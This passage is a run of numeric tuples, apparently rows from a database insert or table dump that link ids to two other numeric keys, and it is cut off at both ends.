),(6709,378,169),(6710,73,169),(6711,59,169),(6712,1672,174),(6713,1572,174),(6714,766,174),(6715,378,174),(6716,73,174),(6717,59,174),(6718,1672,165),(6719,1351,165),(6720,867,165),(6721,766,165),(6722,378,165),(6723,74,165),(6724,73,165),(6725,59,165),(6726,20,165),(6727,9,165),(6728,1672,180),(6729,1351,180),(6730,766,180),(6731,378,180),(6732,1672,158),(6733,1351,158),(6734,766,158),(6735,378,158),(6736,1672,177),(6737,1572,177),(6738,1351,177),(6739,867,177),(6740,766,177),(6741,378,177),(6742,73,177),(6743,59,177),(6744,1672,167),(6745,1572,167),(6746,1351,167),(6747,867,167),(6748,766,167),(6749,414,167),(6750,412,167),(6751,389,167),(6752,378,167),(6753,217,167),(6754,2206,224),(6755,1207,224),(6756,442,224),(6757,287,224),(6758,162,224),(6759,1672,187),(6760,1351,187),(6761,766,187),(6762,498,187),(6763,378,187),(6764,59,187),(6765,1672,204),(6766,1572,204),(6767,1351,204),(6768,1351,204),(6769,867,204),(6770,766,204),(6771,766,204),(6772,59,204),(6773,645,149),(6774,171,149),(6775,168,149),(6776,16,149),(6777,1863,144),(6778,1431,144),(6779,645,144),(6780,504,144),(6781,344,144),(6782,287,144),(6783,190,144),(6784,137,144),(6785,1672,163),(6786,1351,163),(6787,766,163),(6788,378,163),(6789,59,163),(6790,54,163),(6791,2942,130),(6792,2859,130),(6793,2220,130),(6794,2011,130),(6795,1979,130),(6796,1920,130),(6797,1720,130),(6798,1688,130),(6799,1470,130),(6800,1431,130),(6801,1351,130),(6802,1342,130),(6803,1390,130),(6804,470,130),(6805,836,130),(6806,769,130),(6807,768,130),(6808,728,130),(6809,304,130),(6810,1672,203),(6811,1572,203),(6812,1351,203),(6813,867,203),(6814,766,203),(6815,378,203),(6816,73,203),(6817,59,203),(6818,1351,156),(6819,766,156),(6820,378,156),(6821,73,156),(6822,1672,202),(6823,1351,202),(6824,766,202),(6825,645,202),(6826,498,202),(6827,378,202),(6828,73,202),(6829,1672,170),(6830,1572,170),(6831,1351,170),(6832,867,170),(6833,766,170),(6834,378,170),(6835,59,170),(6836,1512,243),(6837,1480,243),(6838,442,243),(6839,287,243),(6840,162,243),(6841,1572,208),(6842,1351,208),(6843,766,208),(6844,378,208),(6845,73,208),(6846,59,208),(6847,2206,223),(6848,1979,223),(6849,1672,223),(6850,1572,223),(6851,1512,223),(6852,1480,223),(6853,1351,223),(6854,1207,223),(6855,867,223),(6856,766,223),(6857,442,223),(6858,378,223),(6859,287,223),(6860,162,223),(6861,2679,165),(6862,2206,165),(6863,1672,227),(6864,1572,227),(6865,1351,227),(6866,867,227),(6867,766,227),(6868,59,227),(6869,1672,236),(6870,1512,236),(6871,59,236),(6872,1672,200),(6873,1572,200),(6874,1351,200),(6875,867,200),(6876,59,200),(6877,54,200),(6878,1672,181),(6879,1572,181),(6880,1351,181),(6881,378,181),(6882,73,181),(6883,59,181),(6884,766,173),(6885,378,173),(6886,73,173),(6887,1351,226),(6888,867,226),(6889,766,226),(6890,59,226),(6891,1672,166),(6892,1351,166),(6893,766,166),(6894,59,166),(6895,54,166),(6896,1672,178),(6897,766,178),(6898,378,178),(6899,73,178),(6900,59,178),(6901,1672,245),(6902,1572,245),(6903,1351,245),(6904,867,245),(6905,378,245),(6906,1572,199),(6907,867,199),(6908,766,199),(6909,378,199),(6910,73,199),(6911,1207,166),(6912,1572,218),(6913,1351,218),(6914,766,218),(6915,378,218),(6916,73,218),(6917,59,218),(6918,442,204),(6919,162,200),(6920,766,181),(6921,1672,195),(6922,1572,195),(6923,1351,195),(6924,867,195),(6925,766,195),(6926,498,195),(6927,378,195),(6928,342,195),(6929,73,195),(6930,59,195),(6931,36,195),(6932,13,195),(6933,9,195),(6934,7,195),(6935,1572,201),(6936,1351,201),(6937,867,201),(6938,766,201),(6939,378,201),(6940,59,201),(6941,1351,191),(6942,378,191),(6943,73,191),(6944,1672,188),(6945,1351,188),(6946,766,188),(6947,378,188),(6948,73,188),(6949,59,188),(6950,287,204),(6951,1572,228),(6952,162,228),(6953,59,228),(6954,2206,210),(6955,9,210),(6956,7,210),(6957,1207,228),(6958,1672,185),(6959,1572,185),(6960,1351,185),(6961,59,185),(6962,1672,161),(6963,1351,161),(6964,766,161),(6965,378,161),(6966,73,161),(6967,59,161),(6968,1672,192),(6969,1351,192),(6970,766,192),(6971,378,192),(6972,73,192),(6973,59,192),(6974,1672,171),(6975,1572,171),(6976,1351,171),(6977,867,171),(6978,766,171),(6979,378,171),(6980,73,171),(6981,59,171),(6982,378,166),(6983,73,166),(6984,1672,175),(6985,1572,175),(6986,1351,175),(6987,766,175),(6988,378,175),(6989,73,175),(6990,59,175),(6991,13,175),(6992,1351,186),(6993,766,186),(6994,378,186),(6995,73,186),(6996,59,186),(6997,1572,176),(6998,1351,176),(6999,867,176),(7000,766,176),(7001,73,176),(7002,59,176),(7003,1672,179),(7004,1572,179),(7005,1351,179),(7006,867,179),(7007,766,179),(7008,378,179),(7009,73,179),(7010,59,179),(7011,54,179),(7012,1672,198),(7013,1572,198),(7014,1351,198),(7015,867,198),(7016,766,198),(7017,378,198),(7018,73,198),(7019,459,174),(7020,1572,197),(7021,1351,197),(7022,766,197),(7023,378,197),(7024,59,197),(7025,1572,196),(7026,1351,196),(7027,1672,213),(7028,1572,213),(7029,1351,213),(7030,867,196),(7031,766,196),(7032,378,196),(7033,198,196),(7034,378,213),(7035,73,196),(7036,59,196),(7037,59,213),(7038,1672,211),(7039,1572,211),(7040,1351,211),(7041,867,211),(7042,766,211),(7043,378,211),(7044,73,211),(7045,59,211),(7046,1672,232),(7047,1572,232),(7048,1351,232),(7049,867,232),(7050,378,232),(7051,1480,157),(7052,1351,228),(7053,766,228),(7054,1572,231),(7055,1351,231),(7056,867,231),(7057,766,231),(7058,73,231),(7059,59,231),(7060,1672,168),(7061,1351,168),(7062,766,168),(7063,59,168),(7064,54,168),(7065,1672,212),(7066,1572,212),(7067,1351,212),(7068,867,212),(7069,766,212),(7070,378,212),(7071,120,212),(7072,73,212),(7073,59,212),(7074,2678,184),(7075,1672,184),(7076,1572,184),(7077,1351,184),(7078,867,184),(7079,766,184),(7080,378,184),(7081,73,184),(7082,59,184),(7083,1920,234),(7084,1672,234),(7085,1572,234),(7086,1351,234),(7087,766,234),(7088,442,234),(7089,378,234),(7090,73,234),(7091,59,234),(7092,48,234),(7093,73,197),(7094,1572,190),(7095,1351,190),(7096,867,190),(7097,766,190),(7098,378,190),(7099,73,190),(7100,59,190),(7101,1672,222),(7102,1351,222),(7103,766,222),(7104,378,222),(7105,73,222),(7106,59,222),(7107,54,222),(7108,2614,237),(7109,2319,237),(7110,2133,237),(7111,2022,237),(7112,1886,237),(7113,566,237),(7114,498,237),(7115,463,237),(7116,378,237),(7117,73,237),(7118,378,228),(7119,378,176),(7120,73,163),(7121,1572,182),(7122,1351,182),(7123,1207,182),(7124,867,182),(7125,766,182),(7126,442,182),(7127,287,182),(7128,1672,216),(7129,1351,216),(7130,867,216),(7131,766,216),(7132,2206,207),(7133,1979,207),(7134,1512,207),(7135,1480,207),(7136,1207,207),(7137,287,207),(7138,162,207),(7139,2942,135),(7140,2011,135),(7141,1678,135),(7142,1662,135),(7143,1108,135),(7144,1165,135),(7145,1119,135),(7146,860,135),(7147,771,135),(7148,645,135),(7149,229,135),(7150,20,135),(7151,1672,206),(7152,1572,206),(7153,1351,206),(7154,867,206),(7155,766,206),(7156,378,206),(7157,73,206),(7158,59,206),(7159,2574,136),(7160,1431,136),(7161,1185,136),(7162,470,136),(7163,836,136),(7164,168,136),(7165,1672,218),(7166,2574,193),(7167,1672,193),(7168,1351,193),(7169,766,193),(7170,378,193),(7171,73,193),(7172,2679,183),(7173,2574,183),(7174,1732,183),(7175,1380,183),(7176,2574,186),(7177,1732,186),(7178,1716,129),(7179,645,129),(7180,628,129),(7181,66,129),(7182,2574,233),(7183,1732,233),(7184,1732,180),(7185,1119,180),(7186,709,180),(7187,1732,221),(7188,1672,221),(7189,1572,221),(7190,1351,221),(7191,1207,221),(7192,867,221),(7193,766,221),(7194,73,221),(7195,2574,242),(7196,2319,242),(7197,1732,242),(7198,378,242),(7199,73,242),(7200,1732,177),(7201,2574,205),(7202,1732,205),(7203,645,205),(7204,9,205),(7205,7,205),(7206,4,205),(7207,1732,219),(7208,1672,219),(7209,1572,219),(7210,1351,219),(7211,867,219),(7212,766,219),(7213,378,219),(7214,73,219),(7215,59,219),(7216,48,219),(7217,1732,162),(7218,1539,162),(7219,2643,156),(7220,2485,156),(7221,1991,156),(7222,1732,156),(7223,389,205),(7224,136,205),(7225,2574,197),(7226,1732,197),(7227,342,197),(7228,1672,214),(7229,1351,214),(7230,867,214),(7231,766,214),(7232,378,214),(7233,59,214),(7234,48,214),(7235,1,214),(7236,1672,235),(7237,1572,235),(7238,1351,235),(7239,867,235),(7240,766,235),(7241,73,235),(7242,59,235),(7243,2574,228),(7244,1732,228),(7245,1732,182),(7246,59,182),(7247,2574,165),(7248,1732,165),(7249,1672,189),(7250,1572,189),(7251,867,189),(7252,766,189),(7253,378,189),(7254,73,189),(7255,59,189),(7256,766,200),(7257,378,200),(7258,73,200),(7259,59,223),(7260,1,223),(7261,2574,191),(7262,1732,191),(7263,2942,240),(7264,2798,240),(7265,2521,240),(7266,2235,240),(7267,2206,240),(7268,1979,240),(7269,1929,240),(7270,1672,240),(7271,1572,240),(7272,1512,240),(7273,1480,240),(7274,1351,240),(7275,1343,240),(7276,1207,240),(7277,1137,240),(7278,977,240),(7279,876,240),(7280,875,240),(7281,867,240),(7282,832,240),(7283,704,240),(7284,766,240),(7285,746,240),(7286,724,240),(7287,665,240),(7288,658,240),(7289,643,240),(7290,560,240),(7291,442,240),(7292,441,240),(7293,378,240),(7294,374,240),(7295,367,240),(7296,347,240),(7297,338,240),(7298,287,240),(7299,242,240),(7300,238,240),(7301,217,240),(7302,209,240),(7303,191,240),(7304,190,240),(7305,169,240),(7306,162,240),(7307,153,240),(7308,136,240),(7309,121,240),(7310,74,240),(7311,73,240),(7312,70,240),(7313,49,240),(7314,42,240),(7315,35,240),(7316,34,240),(7317,33,240),(7318,29,240),(7319,27,240),(7320,26,240),(7321,21,240),(7322,11,240),(7323,9,240),(7324,4,240),(7325,1,240),(7326,2220,147),(7327,1920,147),(7328,1684,147),(7329,645,147),(7330,198,147),(7331,2574,194),(7332,1732,194),(7333,1672,194),(7334,1572,194),(7335,1351,194),(7336,867,194),(7337,766,194),(7338,645,194),(7339,378,194),(7340,73,194),(7341,2574,181),(7342,2206,229),(7343,2206,229),(7344,1979,229),(7345,1672,229),(7346,1572,229),(7347,1512,229),(7348,1480,229),(7349,1480,229),(7350,1351,229),(7351,1351,229),(7352,1207,229),(7353,1207,229),(7354,867,229),(7355,766,229),(7356,442,229),(7357,287,229),(7358,162,229),(7359,59,229),(7360,1732,172),(7361,1672,172),(7362,1351,172),(7363,766,172),(7364,378,172),(7365,73,172),(7366,54,172),(7367,1672,220),(7368,1351,220),(7369,766,220),(7370,378,220),(7371,73,220),(7372,59,220),(7373,54,220),(7374,48,220),(7375,378,168),(7376,73,168),(7377,2574,160),(7378,2469,160),(7379,2235,160),(7380,1732,160),(7381,378,160),(7382,73,160),(7383,9,160),(7384,2574,166),(7385,2574,154),(7386,2206,154),(7387,1979,154),(7388,1732,154),(7389,1672,154),(7390,1572,154),(7391,1512,154),(7392,1480,154),(7393,1351,154),(7394,1207,154),(7395,1154,154),(7396,867,154),(7397,766,154),(7398,442,154),(7399,378,154),(7400,287,154),(7401,162,154),(7402,73,154),(7403,66,154),(7404,59,154),(7405,48,154),(7406,35,154),(7407,27,154),(7408,26,154),(7409,9,154),(7410,1,154),(7411,2574,158),(7412,1732,158),(7413,14,158),(7414,645,128),(7415,349,128),(7416,62,128),(7417,2595,151),(7418,2418,151),(7419,2325,151),(7420,1528,151),(7421,1108,151),(7422,989,151),(7423,796,151),(7424,766,151),(7425,645,151),(7426,461,151),(7427,448,151),(7428,442,151),(7429,434,151),(7430,389,151),(7431,67,151),(7432,62,151),(7433,43,151),(7434,2828,148),(7435,2351,148),(7436,2089,148),(7437,1464,148),(7438,1394,148),(7439,1185,148),(7440,470,148),(7441,168,148),(7442,62,148),(7443,2864,137),(7444,2451,137),(7445,2418,137),(7446,989,137),(7447,868,137),(7448,796,137),(7449,771,137),(7450,709,137),(7451,645,137),(7452,461,137),(7453,448,137),(7454,442,137),(7455,434,137),(7456,415,137),(7457,292,137),(7458,202,137),(7459,67,137),(7460,66,137),(7461,43,137),(7462,1979,133),(7463,1688,133),(7464,1347,133),(7465,1281,133),(7466,2225,133),(7467,1207,133),(7468,1185,133),(7469,1390,133),(7470,931,133),(7471,470,133),(7472,836,133),(7473,769,133),(7474,768,133),(7475,728,133),(7476,645,133),(7477,168,133),(7478,145,133),(7479,144,133),(7480,141,133),(7481,100,133),(7482,63,133),(7483,62,133),(7484,2574,249),(7485,2469,249),(7486,2235,249),(7487,2206,249),(7488,1979,249),(7489,1732,249),(7490,1672,249),(7491,1572,249),(7492,1512,249),(7493,1480,249),(7494,1351,249),(7495,1207,249),(7496,867,249),(7497,766,249),(7498,709,249),(7499,557,249),(7500,442,249),(7501,378,249),(7502,287,249),(7503,162,249),(7504,73,249),(7505,59,249),(7506,1979,145),(7507,2022,134),(7508,1979,134),(7509,1720,134),(7510,1688,134),(7511,1582,134),(7512,1480,134),(7513,1351,134),(7514,1281,134),(7515,1185,134),(7516,1390,134),(7517,836,134),(7518,769,134),(7519,768,134),(7520,728,134),(7521,566,134),(7522,485,134),(7523,304,134),(7524,240,134),(7525,168,134),(7526,73,134),(7527,53,134),(7528,1108,132),(7529,1119,132),(7530,137,132),(7531,128,132),(7532,766,143),(7533,231,143),(7534,190,143),(7535,137,143),(7536,28,143),(7537,378,221),(7538,59,221),(7539,1732,171),(7540,9,171),(7541,73,228),(7542,2574,238),(7543,1732,238),(7544,1672,238),(7545,1351,238),(7546,867,238),(7547,766,238),(7548,378,238),(7549,59,238),(7550,59,172),(7551,73,187),(7552,2574,201),(7553,1732,201),(7554,442,207),(7555,2574,226),(7556,1732,226),(7557,1672,226),(7558,378,226),(7559,73,226),(7560,121,146),(7561,2206,157),(7562,442,157),(7563,287,157),(7564,1672,217),(7565,1351,217),(7566,867,217),(7567,59,217),(7568,2574,159),(7569,2319,159),(7570,1732,159),(7571,1572,159),(7572,867,159),(7573,766,159),(7574,378,159),(7575,73,159),(7576,1979,157),(7577,1512,157),(7578,2652,162),(7579,2485,162),(7580,2235,162),(7581,1991,162),(7582,1588,162),(7583,645,162),(7584,2574,237),(7585,1732,237),(7586,73,201),(7587,2574,240),(7588,1732,240),(7589,59,240),(7590,1732,213),(7591,766,213),(7592,73,213),(7593,1672,210),(7594,1572,210),(7595,1351,210),(7596,867,210),(7597,766,210),(7598,378,210),(7599,73,210),(7600,69,210),(7601,59,210),(7602,190,142),(7603,7,142),(7604,378,231),(7605,2574,244),(7606,2206,244),(7607,1979,244),(7608,1732,244),(7609,1672,244),(7610,1572,244),(7611,1351,244),(7612,1207,244),(7613,867,244),(7614,766,244),(7615,442,244),(7616,378,244),(7617,287,244),(7618,162,244),(7619,73,244),(7620,2169,141),(7621,1833,141),(7622,1365,141),(7623,1342,141),(7624,1228,141),(7625,645,141),(7626,1672,243),(7627,442,141),(7628,1351,243),(7629,137,141),(7630,766,243),(7631,378,243),(7632,59,243),(7633,766,232),(7634,73,232),(7635,73,170),(7636,73,238),(7637,2574,208),(7638,1732,208),(7639,1572,236),(7640,1351,236),(7641,867,236),(7642,766,236),(7643,378,236),(7644,73,236),(7645,378,229),(7646,73,229),(7647,1672,215),(7648,1572,215),(7649,1351,215),(7650,867,215),(7651,766,215),(7652,378,227),(7653,73,227),(7654,14,146),(7655,2574,185),(7656,766,185),(7657,378,185),(7658,73,185),(7659,1893,183),(7660,724,183),(7661,2942,131),(7662,2769,131),(7663,2011,131),(7664,1678,131),(7665,1662,131),(7666,1221,131),(7667,1108,131),(7668,1165,131),(7669,1119,131),(7670,771,131),(7671,645,131),(7672,28,131),(7673,2,131),(7674,2778,163),(7675,2544,163),(7676,2180,163),(7677,2000,163),(7678,1732,163),(7679,1588,163),(7680,645,163),(7681,2485,191),(7682,1588,191),(7683,2574,192),(7684,1732,192),(7685,2942,218),(7686,2798,218),(7687,2574,218),(7688,1732,218),(7689,2011,140),(7690,1920,140),(7691,1207,140),(7692,1287,140),(7693,706,140),(7694,260,140),(7695,64,138),(7696,63,138),(7697,62,138),(7698,2574,177),(7699,2485,177),(7700,1991,177),(7701,724,177),(7702,724,165),(7703,303,165),(7704,2485,165),(7705,2206,245),(7706,442,245),(7707,287,245),(7708,73,245),(7709,2574,164),(7710,2485,164),(7711,1991,164),(7712,1732,164),(7713,1588,164),(7714,1422,164),(7715,1413,164),(7716,724,164),(7717,303,164),(7718,59,215),(7719,2574,203),(7720,1732,203),(7721,1961,228),(7722,1672,207),(7723,59,207),(7724,1893,156),(7725,2574,182),(7726,189,182),(7727,26,182),(7728,1,182),(7729,2485,183),(7730,1991,183),(7731,1588,183),(7732,2824,135),(7733,1213,135),(7734,7,135),(7735,2932,134),(7736,2917,134),(7737,2859,134),(7738,2595,134),(7739,2220,134),(7740,2206,134),(7741,1486,134),(7742,1342,134),(7743,762,134),(7744,476,134),(7745,461,134),(7746,2574,178),(7747,2485,178),(7748,1732,178),(7749,575,178),(7750,1991,197),(7751,724,197),(7752,2574,195),(7753,2485,195),(7754,1732,195),(7755,1413,195),(7756,724,195),(7757,1417,186),(7758,1413,186),(7759,303,186),(7760,1413,165),(7761,28,165),(7762,29,165),(7763,55,165),(7764,2485,166),(7765,1991,166),(7766,1732,166),(7767,724,166),(7768,303,166),(7769,2574,175),(7770,1732,175),(7771,1588,175),(7772,1413,175),(7773,14,175),(7774,1,175),(7775,2574,172),(7776,2485,172),(7777,1991,172),(7778,724,172),(7779,1732,214),(7780,1572,214),(7781,73,214),(7782,2485,169),(7783,1991,169),(7784,1732,169),(7785,1413,169),(7786,303,169),(7787,2824,163),(7788,1876,163),(7789,1748,163),(7790,2824,183),(7791,1876,183),(7792,2824,179),(7793,14,179),(7794,1,179),(7795,2824,198),(7796,2574,198),(7797,1732,198),(7798,1588,198),(7799,2824,249),(7800,2485,249),(7801,1876,249),(7802,1588,249),(7803,2824,208),(7804,1876,208),(7805,2824,215),(7806,1876,215),(7807,1732,215),(7808,2824,158),(7809,1991,158),(7810,1876,158),(7811,724,158),(7812,303,158),(7813,2485,180),(7814,1991,180),(7815,1876,180),(7816,1413,180),(7817,303,180),(7818,2848,191),(7819,2824,191),(7820,2824,193),(7821,1876,193),(7822,59,193),(7823,2824,182),(7824,1876,182),(7825,2574,206),(7826,1991,206),(7827,1732,206),(7828,724,206),(7829,2485,242),(7830,1991,242),(7831,1876,242),(7832,2574,168),(7833,2485,168),(7834,1991,168),(7835,1876,168),(7836,1732,168),(7837,2574,176),(7838,2185,176),(7839,1961,176),(7840,1732,176),(7841,27,176),(7842,2824,161),(7843,2574,161),(7844,2485,161),(7845,1991,161),(7846,1732,161),(7847,2824,228),(7848,1876,181),(7849,1732,181),(7850,1588,181),(7851,2956,189),(7852,2574,189),(7853,1732,189),(7854,1464,189),(7855,1281,189),(7856,2824,173),(7857,2574,173),(7858,1876,173),(7859,14,173),(7860,2824,162),(7861,2389,162),(7862,1876,162),(7863,1413,162),(7864,2965,130),(7865,2652,130),(7866,2651,130),(7867,2535,130),(7868,2520,130),(7869,2485,130),(7870,2433,130),(7871,2427,130),(7872,2396,130),(7873,2169,130),(7874,2160,130),(7875,2119,130),(7876,1863,130),(7877,1837,130),(7878,1812,130),(7879,1716,130),(7880,1684,130),(7881,1588,130),(7882,1356,130),(7883,1323,130),(7884,1304,130),(7885,1290,130),(7886,1266,130),(7887,1252,130),(7888,1085,130),(7889,202,130),(7890,171,130),(7891,168,130),(7892,2824,205),(7893,1413,205),(7894,209,205),(7895,1876,205),(7896,2824,217),(7897,1876,217),(7898,1572,217),(7899,766,217),(7900,378,217),(7901,73,217),(7902,1672,157),(7903,1351,157),(7904,867,157),(7905,766,157),(7906,162,157),(7907,1572,207),(7908,1351,207),(7909,867,207),(7910,766,207),(7911,378,207),(7912,73,207),(7913,1672,224),(7914,1572,224),(7915,1351,224),(7916,867,224),(7917,766,224),(7918,378,224),(7919,73,224),(7920,59,224),(7921,2824,199),(7922,2574,199),(7923,1876,199),(7924,2824,219),(7925,2485,219),(7926,1876,219),(7927,1588,219),(7928,2824,194),(7929,2389,194),(7930,1876,194),(7931,1588,194),(7932,1413,194),(7933,2485,221),(7934,1991,221),(7935,1588,221),(7936,2574,167),(7937,2235,167),(7938,1876,167),(7939,1281,167),(7940,73,167),(7941,2824,172),(7942,1876,172),(7943,2824,212),(7944,2574,212),(7945,2485,212),(7946,2485,212),(7947,1876,212),(7948,1732,212),(7949,1588,212),(7950,2824,196),(7951,2574,196),(7952,1876,196),(7953,1732,196),(7954,724,196),(7955,41,196),(7956,2824,177),(7957,136,223),(7958,73,223),(7959,58,223),(7960,9,223),(7961,2824,190),(7962,2574,190),(7963,2485,190),(7964,1732,190),(7965,1588,190),(7966,2824,145),(7967,1512,145),(7968,1185,145),(7969,1390,145),(7970,769,145),(7971,728,145),(7972,566,145),(7973,304,145),(7974,137,145),(7975,1732,211),(7976,724,211),(7977,41,211),(7978,2824,226),(7979,1588,226),(7980,724,226),(7981,69,187),(7982,42,187),(7983,26,187),(7984,9,187),(7985,2574,204),(7986,1732,204),(7987,73,204),(7988,1572,157),(7989,378,157),(7990,2373,203),(7991,1876,203),(7992,724,203),(7993,2824,201),(7994,1413,201),(7995,724,201),(7996,1413,215),(7997,724,215),(7998,2824,202),(7999,2772,202),(8000,2574,202),(8001,1876,202),(8002,1732,202),(8003,1413,202),(8004,560,202),(8005,209,202),(8006,1413,218),(8007,2824,160),(8008,2485,160),(8009,1876,160),(8010,1413,160),(8011,724,228),(8012,2824,159),(8013,1876,159),(8014,1413,159),(8015,724,159),(8016,2824,192),(8017,1413,192),(8018,724,192),(8019,2824,238),(8020,2011,238),(8021,1929,238),(8022,1920,238),(8023,1470,238),(8024,2485,185),(8025,1991,185),(8026,1732,185),(8027,1413,185),(8028,724,185),(8029,560,185),(8030,2206,230),(8031,1979,230),(8032,1672,230),(8033,1572,230),(8034,1512,230),(8035,1480,230),(8036,1413,230),(8037,1351,230),(8038,1207,230),(8039,867,230),(8040,766,230),(8041,724,230),(8042,442,230),(8043,378,230),(8044,287,230),(8045,162,230),(8046,73,230),(8047,59,230),(8048,1732,223),(8049,1413,223),(8050,724,223),(8051,2824,240),(8052,2772,240),(8053,1876,240),(8054,1413,240),(8055,2824,229),(8056,1732,229),(8057,1413,229),(8058,724,229),(8059,560,229),(8060,2824,233),(8061,1413,233),(8062,560,233),(8063,209,233),(8064,1413,226),(8065,169,226),(8066,2824,170),(8067,1732,170),(8068,1413,170),(8069,724,170),(8070,1582,139),(8071,1512,139),(8072,470,139),(8073,836,139),(8074,768,139),(8075,645,139),(8076,442,139),(8077,304,139),(8078,168,139),(8079,62,139),(8080,36,139),(8081,2824,227),(8082,724,227),(8083,560,227),(8084,2824,195),(8085,2772,195),(8086,1876,195),(8087,560,195),(8088,209,195),(8089,41,195),(8090,2824,197),(8091,1876,197),(8092,1413,197),(8093,560,197),(8094,1413,156),(8095,560,156),(8096,209,156),(8097,2932,130),(8098,2869,130),(8099,2657,130),(8100,2595,130),(8101,2206,130),(8102,1365,130),(8103,1185,130),(8104,1009,130),(8105,868,130),(8106,762,130),(8107,693,130),(8108,645,130),(8109,476,130),(8110,461,130),(8111,405,130),(8112,389,130),(8113,342,130),(8114,266,130),(8115,231,130),(8116,2824,175),(8117,1876,175),(8118,724,175),(8119,560,175),(8120,209,175),(8121,2824,235),(8122,2574,235),(8123,1876,235),(8124,1732,235),(8125,1413,235),(8126,724,235),(8127,1413,211),(8128,378,235),(8129,560,211),(8130,209,211),(8131,1732,243),(8132,724,243),(8133,41,243),(8134,1732,179),(8135,1413,179),(8136,724,179),(8137,560,179),(8138,209,179),(8139,2772,162),(8140,209,162),(8141,58,162),(8142,53,162),(8143,50,162),(8144,2772,198),(8145,1413,198),(8146,724,198),(8147,560,198),(8148,209,198),(8149,1413,172),(8150,560,172),(8151,209,172),(8152,13,172),(8153,2824,136),(8154,2535,136),(8155,2485,136),(8156,1945,136),(8157,1913,136),(8158,1720,136),(8159,1662,136),(8160,1389,136),(8161,1365,136),(8162,1221,136),(8163,1313,136),(8164,1085,136),(8165,771,136),(8166,769,136),(8167,768,136),(8168,415,136),(8169,319,136),(8170,258,136),(8171,204,136),(8172,171,136),(8173,62,136),(8174,43,136),(8175,2535,148),(8176,1945,148),(8177,1913,148),(8178,1085,148),(8179,769,148),(8180,768,148),(8181,415,148),(8182,319,148),(8183,204,148),(8184,171,148),(8185,43,148),(8186,1413,203),(8187,560,203),(8188,209,203),(8189,2824,166),(8190,1876,166),(8191,1413,166),(8192,209,166),(8193,88,166),(8194,66,166),(8195,13,166),(8196,9,166),(8197,7,166),(8198,2824,169),(8199,2772,169),(8200,1876,169),(8201,2772,183),(8202,1424,183),(8203,1413,183),(8204,1074,183),(8205,560,183),(8206,209,183),(8207,1074,195),(8208,2772,237),(8209,2485,237),(8210,1991,237),(8211,1413,237),(8212,209,237),(8213,2772,161),(8214,1413,161),(8215,1413,178),(8216,724,178),(8217,560,178),(8218,1413,228),(8219,2772,205),(8220,724,205),(8221,560,205),(8222,1876,186),(8223,1413,182),(8224,724,182),(8225,560,182),(8226,2824,176),(8227,1876,176),(8228,1413,176),(8229,724,176),(8230,2772,156),(8231,1074,156),(8232,1732,210),(8233,1413,210),(8234,724,210),(8235,209,210),(8236,27,210),(8237,2824,213),(8238,2574,213),(8239,1876,213),(8240,1413,213),(8241,724,213),(8242,560,213),(8243,209,213),(8244,1,213),(8245,1732,199),(8246,1413,199),(8247,724,199),(8248,1732,173),(8249,1413,173),(8250,724,173),(8251,209,173),(8252,1732,232),(8253,724,232),(8254,560,232),(8255,59,232),(8256,2772,175),(8257,2824,214),(8258,1876,214),(8259,724,214),(8260,1413,208),(8261,724,208),(8262,560,208),(8263,1413,177),(8264,560,177),(8265,209,177),(8266,1413,206),(8267,1413,189),(8268,724,189),(8269,560,189),(8270,1413,193),(8271,209,193),(8272,724,167),(8273,2824,236),(8274,2574,236),(8275,1876,236),(8276,1732,236),(8277,1413,236),(8278,724,236),(8279,560,236),(8280,1732,187),(8281,1413,187),(8282,724,187),(8283,209,187),(8284,2772,212),(8285,1413,212),(8286,724,212),(8287,560,212),(8288,209,212),(8289,2772,219),(8290,1413,219),(8291,724,219),(8292,560,219),(8293,209,219),(8294,2824,181),(8295,1413,181),(8296,724,181),(8297,560,181),(8298,209,181),(8299,1413,249),(8300,724,249),(8301,209,249),(8302,2574,245),(8303,1732,245),(8304,724,245),(8305,1413,244),(8306,724,244),(8307,209,244),(8308,59,244),(8309,2485,163),(8310,1413,163),(8311,724,163),(8312,560,163),(8313,1413,190),(8314,724,190),(8315,560,190),(8316,560,249),(8317,2574,231),(8318,1732,231),(8319,1413,231),(8320,724,231),(8321,209,231),(8322,560,218),(8323,2824,234),(8324,2574,234),(8325,1876,234),(8326,1732,234),(8327,1588,234),(8328,1413,234),(8329,724,234),(8330,560,234),(8331,441,234),(8332,2772,185),(8333,209,185),(8334,2772,196),(8335,1413,196),(8336,560,196),(8337,209,196),(8338,209,243),(8339,2824,220),(8340,2574,220),(8341,1732,220),(8342,1413,220),(8343,724,220),(8344,560,220),(8345,43,220),(8346,151,163),(8347,560,243),(8348,2169,151),(8349,2133,151),(8350,2000,151),(8351,1833,151),(8352,1816,151),(8353,1380,151),(8354,1227,151),(8355,1228,151),(8356,532,151),(8357,476,151),(8358,303,151),(8359,292,151),(8360,266,151),(8361,249,151),(8362,209,151),(8363,155,151),(8364,560,187),(8365,1991,224),(8366,1732,224),(8367,724,224),(8368,2574,188),(8369,1732,188),(8370,1413,188),(8371,724,188),(8372,209,188),(8373,209,226),(8374,2772,164),(8375,1876,164),(8376,560,164),(8377,209,164),(8378,1413,158),(8379,209,158),(8380,1732,157),(8381,1413,157),(8382,724,157),(8383,73,157),(8384,560,201),(8385,2772,238),(8386,1413,238),(8387,560,238),(8388,209,238),(8389,1413,191),(8390,724,191),(8391,209,191),(8392,2772,194),(8393,1074,194),(8394,724,194),(8395,560,194),(8396,209,194),(8397,209,159),(8398,1413,168),(8399,326,237),(8400,231,237),(8401,560,210),(8402,1748,162),(8403,1074,162),(8404,389,162),(8405,151,162),(8406,560,180),(8407,1413,242),(8408,209,242),(8409,392,163),(8410,2772,232),(8411,1413,232),(8412,560,192),(8413,560,176),(8414,560,228),(8415,2772,230),(8416,1732,230),(8417,560,230),(8418,209,230),(8419,69,226),(8420,29,226),(8421,27,226),(8422,26,226),(8423,1763,163),(8424,2772,208),(8425,209,208),(8426,2932,150),(8427,2824,150),(8428,2545,150),(8429,2485,150),(8430,1991,150),(8431,1876,150),(8432,1732,150),(8433,1704,150),(8434,1486,150),(8435,1431,150),(8436,2225,150),(8437,762,150),(8438,724,150),(8439,645,150),(8440,350,150),(8441,171,150),(8442,162,150),(8443,88,150),(8444,29,150),(8445,16,150),(8446,2206,209),(8447,1979,209),(8448,1732,209),(8449,1672,209),(8450,1572,209),(8451,1512,209),(8452,1480,209),(8453,1351,209),(8454,1207,209),(8455,867,209),(8456,766,209),(8457,724,209),(8458,442,209),(8459,378,209),(8460,287,209),(8461,162,209),(8462,73,209),(8463,59,209),(8464,1552,142),(8465,1310,142),(8466,1011,142),(8467,793,142),(8468,768,142),(8469,540,142),(8470,486,142),(8471,477,142),(8472,387,142),(8473,338,142),(8474,2